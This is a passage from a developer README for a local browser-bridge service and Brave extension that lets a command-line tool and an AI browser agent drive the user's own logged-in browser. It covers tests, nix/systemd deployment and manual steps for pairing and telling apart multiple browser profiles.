routing `DOM.setFileInputFiles` into the leaf session via the SAME shared resolver.
`frame_eval_cdp.test.mjs`
covers the `eval --frame` CDP `Runtime.evaluate` fix (same-process + OOPIF context
resolution, never-silent-null, #189 timeout no-wedge); `frame_oopif.test.mjs` covers the
OOPIF frame enumeration/resolution (incl. **host-preferred + ambiguity-safe** `--frame`
matching) and the injected page functions — the **click-exactly-once** synthetic click
(no double-fire) and the **no-editable-target** type refusal (no false `typed:N`); the
`protocol.test.mjs` cases cover the screenshot settle+retry decision logic
(`isTransientCaptureError` / `isCaptureQuotaError` / `captureWithRetry`): a spaced retry
never re-trips the ~2/sec quota, a non-transient error propagates immediately, and the
#182 quota error waits a full window. The live browser-driving loop (real DeepSeek + real
Brave) canNOT run in CI; the chrome.* glue in `service_worker.js` and the
end-to-end agent run are covered by the manual checklists (`extension/README.md` +
"opencode browser-agent" above). The two `opencode debug agent` checks under
"Manual live check" verify the bash-denied / typed-tool-only contract on a host
WITHOUT a model.

## Deploy (nix)

`nix/home.nix` deploys `server.py` to `~/.config/browser-bridge/server.py` and
runs it as the `browser-bridge` systemd **user** service (loopback, port 8788,
`X-Restart-Triggers` so `home-manager switch` restarts it on a code change). The
runtime token file lives alongside it in the same real dir.

```bash
home-manager switch --flake ~/workspace/devrc --impure
systemctl --user status browser-bridge
```

## End-to-end manual verification (the one step that needs real Brave)

1. `home-manager switch …` — starts the `browser-bridge` service on 127.0.0.1:8788.
2. Load the extension: Brave → `brave://extensions` → enable **Developer mode** →
   **Load unpacked** → select **`~/.local/share/browser-bridge-ext/`** (the
   git-immune copy written by step 1 — NOT `scripts/browser-bridge/extension/`).
   Full per-profile sequence, including re-pointing a profile that is still on
   the repo path: `extension/README.md`.
3. Open the extension's **options** (⋯ → Options / "Extension options"), paste the
   token from `~/.config/browser-bridge/token`, port `8788`, **Save**.
4. `scripts/browser-bridge/browser health` → `{"ok":true,"extension_connected":true}`
   with `extension_stale:false` on the instance (`null` = undecidable, NOT ok), and
   `scripts/browser-bridge/browser --instance <label> ping` →
   `{"pong":true,"extensionVersion":"0.8.0","buildMarker":"<hex>","id":"<ext-id>",…}` (an `unknown_op`
   here means Brave is still running an older build). Record that `id` — it is
   the per-profile baseline for "which directory is loaded".
5. Focus a tab where you are **logged in** (e.g. Gmail), then
   `scripts/browser-bridge/browser html | grep -i <your-name-or-account-marker>` —
   seeing logged-in-only markup **proves it's the live authenticated session**,
   not a fresh fetch.

### Verifying multiple instances

1. In a **second** Brave profile, load the same unpacked extension and pair it
   (token + port).
2. Give each profile a **unique label** in the extension options (e.g. `work`
   and `personal`), Save, and reload each extension card.
3. `scripts/browser-bridge/browser instances` → both show up (keys `work` /
   `personal`, each with its active-tab url).
4. `scripts/browser-bridge/browser html` with both connected → **errors** and
   lists the instances (it won't guess).
5. `scripts/browser-bridge/browser --instance work html` → returns the `work`
   profile's active tab; `--instance personal html` → the other. That per-tab
   difference confirms targeting.

⚠ After editing anything in `extension/`, click the **reload** ↻ on the
extension card in `brave://extensions` — Brave does not hot-reload unpacked
extensions.
